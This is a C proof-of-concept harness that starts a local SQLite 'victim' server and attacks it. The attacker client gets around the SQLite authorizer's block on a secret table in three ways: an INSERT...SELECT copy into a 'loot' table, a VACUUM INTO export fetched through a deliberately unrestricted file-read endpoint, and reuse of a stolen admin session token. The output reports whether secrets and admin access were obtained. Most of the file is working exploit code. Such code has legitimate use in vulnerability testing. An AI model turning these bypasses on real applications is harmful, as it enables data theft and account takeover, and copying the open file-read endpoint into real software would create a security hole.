#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <signal.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#include "sqlite3.h"

#define SECRET_VALUE "FLAG{sqlite_xfer_authorizer_remote_exfil}"
#define VACUUM_SECRET_VALUE "FLAG{sqlite_vacuum_authorizer_remote_exfil}"
#define ADMIN_SESSION_TOKEN "sess_live_admin_7cd4eec7b9f241b4b5b8"
#define PAYMENT_API_KEY "sk_live_poc_51NxSQLiteAuthorizerBypass"
#define CLOUD_DEPLOY_KEY "AKIAIOSFODNN7EXAMPLE:wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"

typedef struct Output Output;
struct Output {
  char *z;
  size_t n;
  size_t cap;
};

static void out_appendf(Output *pOut, const char *zFmt, ...){
  va_list ap;
  char zStack[1024];
  int n;

  va_start(ap, zFmt);
  n = vsnprintf(zStack, sizeof(zStack), zFmt, ap);
  va_end(ap);
  if( n<0 ) return;

  if( pOut->n + (size_t)n + 1 > pOut->cap ){
    size_t cap = pOut->cap ? pOut->cap : 1024;
    char *zNew;
    while( pOut->n + (size_t)n + 1 > cap ) cap *= 2;
    zNew = (char*)realloc(pOut->z, cap);
    if( zNew==0 ) return;
    pOut->z = zNew;
    pOut->cap = cap;
  }
  if( (size_t)n < sizeof(zStack) ){
    memcpy(&pOut->z[pOut->n], zStack, (size_t)n);
  }else{
    va_start(ap, zFmt);
    vsnprintf(&pOut->z[pOut->n], (size_t)n + 1, zFmt, ap);
    va_end(ap);
  }
  pOut->n += (size_t)n;
  pOut->z[pOut->n] = 0;
}

static int auth_cb(
  void *ctx,
  int code,
  const char *z1,
  const char *z2,
  const char *z3,
  const char *z4
){
  (void)ctx;
  (void)z2;
  (void)z3;
  (void)z4;
  if( code==SQLITE_READ && z1 && strcmp(z1, "secret")==0 ){
    return SQLITE_DENY;
  }
  return SQLITE_OK;
}

static int row_cb(void *pCtx, int nCol, char **azVal, char **azName){
  Output *pRows = (Output*)pCtx;
  int i;
  out_appendf(pRows, "ROW");
  for(i=0; i<nCol; i++){
    out_appendf(pRows, " %s=%s", azName[i], azVal[i] ? azVal[i] : "NULL");
  }
  out_appendf(pRows, "\n");
  return 0;
}

static int write_exact(int fd, const void *pBuf, size_t nBuf){
  const unsigned char *p = (const unsigned char*)pBuf;
  while( nBuf>0 ){
    ssize_t n = write(fd, p, nBuf);
    if( n<0 && errno==EINTR ) continue;
    if( n<=0 ) return -1;
    p += n;
    nBuf -= (size_t)n;
  }
  return 0;
}

static int read_exact(int fd, void *pBuf, size_t nBuf){
  unsigned char *p = (unsigned char*)pBuf;
  while( nBuf>0 ){
    ssize_t n = read(fd, p, nBuf);
    if( n<0 && errno==EINTR ) continue;
    if( n<=0 ) return -1;
    p += n;
    nBuf -= (size_t)n;
  }
  return 0;
}

static char *run_sql(sqlite3 *db, const char *zSql){
  Output rows = {0, 0, 0};
  Output reply = {0, 0, 0};
  char *zErr = 0;
  int rc;

  rc = sqlite3_exec(db, zSql, row_cb, &rows, &zErr);
  if( rc==SQLITE_OK ){
    out_appendf(&reply, "OK rc=0\n");
    if( rows.z ) out_appendf(&reply, "%s", rows.z);
  }else{
    out_appendf(&reply, "ERR rc=%d msg=%s\n", rc, zErr ? zErr : sqlite3_errmsg(db));
  }
  sqlite3_free(zErr);
  free(rows.z);
  return reply.z ? reply.z : strdup("ERR rc=-1 msg=oom\n");
}

static void out_append_hex(Output *pOut, const unsigned char *aData, size_t nData){
  static const char zHex[] = "0123456789abcdef";
  size_t i;
  if( pOut->n + nData*2 + 1 > pOut->cap ){
    size_t cap = pOut->cap ? pOut->cap : 1024;
    char *zNew;
    while( pOut->n + nData*2 + 1 > cap ) cap *= 2;
    zNew = (char*)realloc(pOut->z, cap);
    if( zNew==0 ) return;
    pOut->z = zNew;
    pOut->cap = cap;
  }
  for(i=0; i<nData; i++){
    pOut->z[pOut->n++] = zHex[aData[i] >> 4];
    pOut->z[pOut->n++] = zHex[aData[i] & 0xf];
  }
  pOut->z[pOut->n] = 0;
}

static char *fetch_file_hex(const char *zPath){
  FILE *f = fopen(zPath, "rb");
  Output reply = {0, 0, 0};
  unsigned char aBuf[4096];
  size_t nTotal = 0;
  if( f==0 ){
    out_appendf(&reply, "ERR rc=-1 msg=fopen failed for %s\n", zPath);
    return reply.z ? reply.z : strdup("ERR rc=-1 msg=oom\n");
  }
  out_appendf(&reply, "OK rc=0\nFILE_HEX ");
  for(;;){
    size_t n = fread(aBuf, 1, sizeof(aBuf), f);
    if( n>0 ){
      out_append_hex(&reply, aBuf, n);
      nTotal += n;
    }
    if( n<sizeof(aBuf) ){
      if( ferror(f) ){
        free(reply.z);
        reply.z = 0;
        reply.n = reply.cap = 0;
        out_appendf(&reply, "ERR rc=-1 msg=fread failed\n");
      }
      break;
    }
  }
  fclose(f);
  out_appendf(&reply, "\nFILE_BYTES %zu\n", nTotal);
  return reply.z ? reply.z : strdup("ERR rc=-1 msg=oom\n");
}

static char *admin_endpoint(const char *zToken){
  Output reply = {0, 0, 0};
  if( strcmp(zToken, ADMIN_SESSION_TOKEN)==0 ){
    out_appendf(&reply,
      "OK ADMIN_ACCESS=granted\n"
      "ADMIN_ID=1\n"
      "CAPABILITY=read_all_customer_records\n"
      "CAPABILITY=rotate_production_keys\n"
    );
  }else{
    out_appendf(&reply, "ERR ADMIN_ACCESS=denied\n");
  }
  return reply.z ? reply.z : strdup("ERR rc=-1 msg=oom\n");
}

static char *run_request(sqlite3 *db, const char *zReq){
  if( strncmp(zReq, "FETCH ", 6)==0 ){
    return fetch_file_hex(&zReq[6]);
  }
  if( strncmp(zReq, "ADMIN ", 6)==0 ){
    return admin_endpoint(&zReq[6]);
  }
  return run_sql(db, zReq);
}

static int send_reply(int fd, const char *zReply){
  uint32_t n = (uint32_t)strlen(zReply);
  uint32_t nNet = htonl(n);
  return write_exact(fd, &nNet, sizeof(nNet)) || write_exact(fd, zReply, n);
}

static char *recv_request(int fd){
  uint32_t nNet = 0;
  uint32_t n;
  char *zSql;
  if( read_exact(fd, &nNet, sizeof(nNet)) ) return 0;
  n = ntohl(nNet);
  if( n==0 || n>1000000 ) return 0;
  zSql = (char*)malloc((size_t)n + 1);
  if( zSql==0 ) return 0;
  if( read_exact(fd, zSql, n) ){
    free(zSql);
    return 0;
  }
  zSql[n] = 0;
  return zSql;
}

static int init_victim_db(sqlite3 **ppDb){
  sqlite3 *db = 0;
  char *zErr = 0;
  int rc = sqlite3_open(":memory:", &db);
  if( rc!=SQLITE_OK ) return rc;

  rc = sqlite3_exec(db,
    "CREATE TABLE secret(label TEXT, value TEXT);"
    "CREATE TABLE loot(label TEXT, value TEXT);"
    "INSERT INTO secret VALUES('api_key','" SECRET_VALUE "');"
    "INSERT INTO secret VALUES('backup_key','" VACUUM_SECRET_VALUE "');"
    "INSERT INTO secret VALUES('admin_session','" ADMIN_SESSION_TOKEN "');"
    "INSERT INTO secret VALUES('payment_api_key','" PAYMENT_API_KEY "');"
    "INSERT INTO secret VALUES('cloud_deploy_key','" CLOUD_DEPLOY_KEY "');",
    0, 0, &zErr
  );
  if( rc!=SQLITE_OK ){
    fprintf(stderr, "victim init failed: %s\n", zErr ? zErr : sqlite3_errmsg(db));
    sqlite3_free(zErr);
    sqlite3_close(db);
    return rc;
  }
  sqlite3_set_authorizer(db, auth_cb, 0);
  *ppDb = db;
  return SQLITE_OK;
}

static void victim_server(int listenFd){
  sqlite3 *db = 0;
  int fd;

  if( init_victim_db(&db)!=SQLITE_OK ) _exit(2);
  fd = accept(listenFd, 0, 0);
  if( fd<0 ) _exit(2);

  for(;;){
    char *zSql = recv_request(fd);
    char *zReply;
    if( zSql==0 ) break;
    if( strcmp(zSql, "QUIT")==0 ){
      free(zSql);
      break;
    }
    zReply = run_request(db, zSql);
    (void)send_reply(fd, zReply);
    free(zReply);
    free(zSql);
  }

  close(fd);
  close(listenFd);
  sqlite3_close(db);
  _exit(0);
}

static int send_sql(int fd, const char *zSql, char **pzReply){
  uint32_t n = (uint32_t)strlen(zSql);
  uint32_t nNet = htonl(n);
  uint32_t nReplyNet = 0;
  uint32_t nReply;
  char *zReply;

  *pzReply = 0;
  if( write_exact(fd, &nNet, sizeof(nNet)) ) return -1;
  if( write_exact(fd, zSql, n) ) return -1;
  if( read_exact(fd, &nReplyNet, sizeof(nReplyNet)) ) return -1;
  nReply = ntohl(nReplyNet);
  if( nReply>1000000 ) return -1;
  zReply = (char*)malloc((size_t)nReply + 1);
  if( zReply==0 ) return -1;
  if( read_exact(fd, zReply, nReply) ){
    free(zReply);
    return -1;
  }
  zReply[nReply] = 0;
  *pzReply = zReply;
  return 0;
}

static int connect_loopback(unsigned short port){
  int fd = socket(AF_INET, SOCK_STREAM, 0);
  struct sockaddr_in addr;
  int i;
  if( fd<0 ) return -1;
  memset(&addr, 0, sizeof(addr));
  addr.sin_family = AF_INET;
  addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
  addr.sin_port = htons(port);
  for(i=0; i<100; i++){
    if( connect(fd, (struct sockaddr*)&addr, sizeof(addr))==0 ) return fd;
    usleep(10000);
  }
  close(fd);
  return -1;
}

static int start_victim(unsigned short *pPort, pid_t *pPid){
  int fd = socket(AF_INET, SOCK_STREAM, 0);
  struct sockaddr_in addr;
  socklen_t nAddr = sizeof(addr);
  int yes = 1;
  pid_t pid;

  if( fd<0 ) return -1;
  setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes));
  memset(&addr, 0, sizeof(addr));
  addr.sin_family = AF_INET;
  addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
  addr.sin_port = 0;
  if( bind(fd, (struct sockaddr*)&addr, sizeof(addr)) ) return -1;
  if( listen(fd, 1) ) return -1;
  if( getsockname(fd, (struct sockaddr*)&addr, &nAddr) ) return -1;
  *pPort = ntohs(addr.sin_port);

  pid = fork();
  if( pid<0 ) return -1;
  if( pid==0 ) victim_server(fd);
  close(fd);
  *pPid = pid;
  return 0;
}

static void print_exchange(const char *zLabel, const char *zSql, const char *zReply){
  size_t nReply = zReply ? strlen(zReply) : 0;
  printf("ATTACK %s SQL: %s\n", zLabel, zSql);
  printf("VICTIM %s REPLY:\n", zLabel);
  if( zReply==0 ){
    printf("(null)\n");
  }else if( nReply>2000 ){
    fwrite(zReply, 1, 2000, stdout);
    printf("\n...<truncated reply bytes=%zu>...\n", nReply);
  }else{
    printf("%s", zReply);
  }
}

static void to_hex(const char *zIn, char *zOut, size_t nOut){
  static const char zHex[] = "0123456789abcdef";
  size_t i;
  size_t n = strlen(zIn);
  if( nOut==0 ) return;
  for(i=0; i<n && i*2+2<nOut; i++){
    unsigned char c = (unsigned char)zIn[i];
    zOut[i*2] = zHex[c >> 4];
    zOut[i*2+1] = zHex[c & 0xf];
  }
  zOut[i*2] = 0;
}

static int run_xfer_attack(int fd){
  char *zDirect = 0;
  char *zCopy = 0;
  char *zLoot = 0;
  int directBlocked;
  int copySucceeded;
  int secretStolen;
  int status = 0;

  if( send_sql(fd, "SELECT label,value FROM secret", &zDirect) ) goto io_error;
  print_exchange("direct-secret-read", "SELECT label,value FROM secret", zDirect);

  if( send_sql(fd, "INSERT INTO loot SELECT * FROM secret", &zCopy) ) goto io_error;
  print_exchange("xfer-copy", "INSERT INTO loot SELECT * FROM secret", zCopy);

  if( send_sql(fd, "SELECT label,value FROM loot", &zLoot) ) goto io_error;
  print_exchange("loot-read", "SELECT label,value FROM loot", zLoot);

  directBlocked = zDirect && strstr(zDirect, "ERR rc=23")!=0;
  copySucceeded = zCopy && strstr(zCopy, "OK rc=0")!=0;
  secretStolen = zLoot && strstr(zLoot, SECRET_VALUE)!=0;

  printf("DIRECT_SECRET_READ_BLOCKED=%s\n", directBlocked ? "yes" : "no");
  printf("XFER_COPY_SUCCEEDED=%s\n", copySucceeded ? "yes" : "no");
  printf("SECRET_STOLEN=%s\n", secretStolen ? SECRET_VALUE : "no");

  if( !directBlocked ){
    printf("RESULT=HARNESS_INVALID_POLICY_NOT_ENFORCED\n");
    status = 2;
  }else if( secretStolen ){
    printf("RESULT=VULNERABLE_REMOTE_EXFIL\n");
    status = 3;
  }else{
    printf("RESULT=SAFE_NO_EXFIL\n");
    status = 0;
  }
  goto done;

io_error:
  perror("client/server exchange");
  status = 2;

done:
  free(zDirect);
  free(zCopy);
  free(zLoot);
  return status;
}

static int run_vacuum_attack(int fd){
  char zPath[256];
  char zVacuumSql[512];
  char zFetchReq[512];
  char zSecretHex[sizeof(VACUUM_SECRET_VALUE)*2 + 1];
  char *zDirect = 0;
  char *zVacuum = 0;
  char *zFetch = 0;
  int directBlocked;
  int vacuumSucceeded;
  int exportDownloaded;
  int secretStolen;
  int status = 0;

  snprintf(zPath, sizeof(zPath), "/tmp/sqlite-vacuum-exfil-%ld.db", (long)getpid());
  unlink(zPath);
  snprintf(zVacuumSql, sizeof(zVacuumSql), "VACUUM INTO '%s'", zPath);
  snprintf(zFetchReq, sizeof(zFetchReq), "FETCH %s", zPath);
  to_hex(VACUUM_SECRET_VALUE, zSecretHex, sizeof(zSecretHex));

  if( send_sql(fd, "SELECT label,value FROM secret", &zDirect) ) goto io_error;
  print_exchange("direct-secret-read", "SELECT label,value FROM secret", zDirect);

  if( send_sql(fd, zVacuumSql, &zVacuum) ) goto io_error;
  print_exchange("vacuum-export", zVacuumSql, zVacuum);

  if( send_sql(fd, zFetchReq, &zFetch) ) goto io_error;
  print_exchange("download-export", zFetchReq, zFetch);

  directBlocked = zDirect && strstr(zDirect, "ERR rc=23")!=0;
  vacuumSucceeded = zVacuum && strstr(zVacuum, "OK rc=0")!=0;
  exportDownloaded = zFetch && strstr(zFetch, "FILE_HEX ")!=0;
  secretStolen = zFetch && strstr(zFetch, zSecretHex)!=0;

  printf("DIRECT_SECRET_READ_BLOCKED=%s\n", directBlocked ? "yes" : "no");
  printf("VACUUM_EXPORT_SUCCEEDED=%s\n", vacuumSucceeded ? "yes" : "no");
  printf("EXPORT_DOWNLOADED=%s\n", exportDownloaded ? "yes" : "no");
  printf("SECRET_HEX_NEEDLE=%s\n", zSecretHex);
  printf("SECRET_STOLEN=%s\n", secretStolen ? VACUUM_SECRET_VALUE : "no");

  if( !directBlocked ){
    printf("RESULT=HARNESS_INVALID_POLICY_NOT_ENFORCED\n");
    status = 2;
  }else if( secretStolen ){
    printf("RESULT=VULNERABLE_REMOTE_VACUUM_EXFIL\n");
    status = 3;
  }else{
    printf("RESULT=SAFE_NO_VACUUM_EXFIL\n");
    status = 0;
  }
  goto done;

io_error:
  perror("client/server exchange");
  status = 2;

done:
  unlink(zPath);
  free(zDirect);
  free(zVacuum);
  free(zFetch);
  return status;
}

static char *extract_value(const char *zRows, const char *zLabel){
  char zNeedle[128];
  const char *z;
  const char *zStart;
  const char *zEnd;
  char *zOut;
  size_t n;
  snprintf(zNeedle, sizeof(zNeedle), "label=%s value=", zLabel);
  z = strstr(zRows ? zRows : "", zNeedle);
  if( z==0 ) return 0;
  zStart = z + strlen(zNeedle);
  zEnd = strchr(zStart, '\n');
  if( zEnd==0 ) zEnd = zStart + strlen(zStart);
  n = (size_t)(zEnd - zStart);
  zOut = (char*)malloc(n + 1);
  if( zOut==0 ) return 0;
  memcpy(zOut, zStart, n);
  zOut[n] = 0;
  return zOut;
}

static int run_breakin_attack(int fd){
  char *zDirect = 0;
  char *zBadAdmin = 0;
  char *zCopy = 0;
  char *zLoot = 0;
  char *zToken = 0;
  char *zAdminReq = 0;
  char *zAdmin = 0;
  int directBlocked;
  int copySucceeded;
  int tokenStolen;
  int adminGranted;
  int status = 0;

  if( send_sql(fd, "SELECT label,value FROM secret WHERE label='admin_session'", &zDirect) ){
    goto io_error;
  }
  print_exchange(
    "direct-admin-token-read",
    "SELECT label,value FROM secret WHERE label='admin_session'",
    zDirect
  );

  if( send_sql(fd, "ADMIN attacker_guess", &zBadAdmin) ) goto io_error;
  print_exchange("admin-login-before-theft", "ADMIN attacker_guess", zBadAdmin);

  if( send_sql(fd, "INSERT INTO loot SELECT * FROM secret", &zCopy) ) goto io_error;
  print_exchange("xfer-copy-secrets", "INSERT INTO loot SELECT * FROM secret", zCopy);

  if( send_sql(fd, "SELECT label,value FROM loot", &zLoot) ) goto io_error;
  print_exchange("loot-read-secrets", "SELECT label,value FROM loot", zLoot);

  zToken = extract_value(zLoot, "admin_session");
  if( zToken ){
    size_t n = strlen("ADMIN ") + strlen(zToken) + 1;
    zAdminReq = (char*)malloc(n);
    if( zAdminReq==0 ) goto io_error;
    snprintf(zAdminReq, n, "ADMIN %s", zToken);
    if( send_sql(fd, zAdminReq, &zAdmin) ) goto io_error;
    print_exchange("admin-login-with-stolen-token", zAdminReq, zAdmin);
  }

  directBlocked = zDirect && strstr(zDirect, "ERR rc=23")!=0;
  copySucceeded = zCopy && strstr(zCopy, "OK rc=0")!=0;
  tokenStolen = zToken && strcmp(zToken, ADMIN_SESSION_TOKEN)==0;
  adminGranted = zAdmin && strstr(zAdmin, "ADMIN_ACCESS=granted")!=0;

  printf("DIRECT_ADMIN_TOKEN_READ_BLOCKED=%s\n", directBlocked ? "yes" : "no");
  printf("WRONG_ADMIN_TOKEN_REJECTED=%s\n",
    zBadAdmin && strstr(zBadAdmin, "ADMIN_ACCESS=denied") ? "yes" : "no"
  );
  printf("XFER_COPY_SUCCEEDED=%s\n", copySucceeded ? "yes" : "no");
  printf("STOLEN_ADMIN_SESSION=%s\n", tokenStolen ? zToken : "no");
  printf("STOLEN_PAYMENT_KEY=%s\n",
    zLoot && strstr(zLoot, PAYMENT_API_KEY) ? PAYMENT_API_KEY : "no"
  );
  printf("STOLEN_CLOUD_DEPLOY_KEY=%s\n",
    zLoot && strstr(zLoot, CLOUD_DEPLOY_KEY) ? CLOUD_DEPLOY_KEY : "no"
  );
  printf("ADMIN_BREAKIN=%s\n", adminGranted ? "granted" : "no");

  if( !directBlocked ){
    printf("RESULT=HARNESS_INVALID_POLICY_NOT_ENFORCED\n");
    status = 2;
  }else if( adminGranted ){
    printf("RESULT=VULNERABLE_REMOTE_ADMIN_BREAKIN\n");
    status = 3;
  }else{
    printf("RESULT=SAFE_NO_ADMIN_BREAKIN\n");
    status = 0;
  }
  goto done;

io_error:
  perror("client/server exchange");
  status = 2;

done:
  free(zDirect);
  free(zBadAdmin);
  free(zCopy);
  free(zLoot);
  free(zToken);
  free(zAdminReq);
  free(zAdmin);
  return status;
}

int main(int argc, char **argv){
  unsigned short port = 0;
  pid_t pid = -1;
  int fd;
  int status = 0;
  const char *zMode = "xfer";

  signal(SIGPIPE, SIG_IGN);
  if( start_victim(&port, &pid) ){
    perror("start_victim");
    return 2;
  }
  fd = connect_loopback(port);
  if( fd<0 ){
    perror("connect_loopback");
    kill(pid, SIGKILL);
    return 2;
  }

  printf("victim_listening=127.0.0.1:%u\n", port);
  if( argc>1 ) zMode = argv[1];

  if( strcmp(zMode, "vacuum")==0 ){
    status = run_vacuum_attack(fd);
  }else if( strcmp(zMode, "breakin")==0 ){
    status = run_breakin_attack(fd);
  }else{
    status = run_xfer_attack(fd);
  }
  goto done;

done:
  {
    uint32_t nNet = htonl(4);
    (void)write_exact(fd, &nNet, sizeof(nNet));
    (void)write_exact(fd, "QUIT", 4);
  }
  close(fd);
  if( pid>0 ){
    int wstatus = 0;
    waitpid(pid, &wstatus, 0);
  }
  return status;
}
